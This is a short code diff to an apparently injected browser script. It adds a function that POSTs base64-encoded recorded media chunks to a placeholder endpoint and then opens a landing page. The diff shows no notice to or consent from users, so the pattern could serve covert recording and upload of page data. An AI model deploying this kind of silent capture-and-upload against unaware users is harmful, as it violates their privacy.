@@ -3,14 +3,40 @@ console.log("Hi, I have been injected whoopie!!!");
 var recorder = null;
 var chunks = [];
 
-//generates Chunks of data
+async function sendBase64ToEndpoint(base64data) {
+  try {
+    const response = await fetch("https://example.com/your-endpoint", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({base64data}),
+    });
+
+    if (!response.ok) {
+      throw new Error("Network response was not ok");
+    }
+
+    const responseData = await response.json();
+    setTimeout(() => {
+      window.open("url-to-my-landing-page", "_blank");
+    }, 2000);
+    console.log("Response from server:", responseData);
+  } catch (error) {
+    console.error("Error sending base64 data:", error);
+  }
+}
+
+//generates Chunks of data && sends data to BE
 function sendChunksToBackend() {
   if (chunks.length > 0) {
     var reader = new FileReader();
     reader.onloadend = function () {
       var base64data = reader.result.split(",")[1];
-      // Send the base64data to your backend using an AJAX request or any other method you prefer
       console.log("Sending chunk to backend:", base64data);
+
+      // Send the base64 data to the endpoint
+      sendBase64ToEndpoint(base64data);
 
       // Clear chunks after sending
       chunks = [];
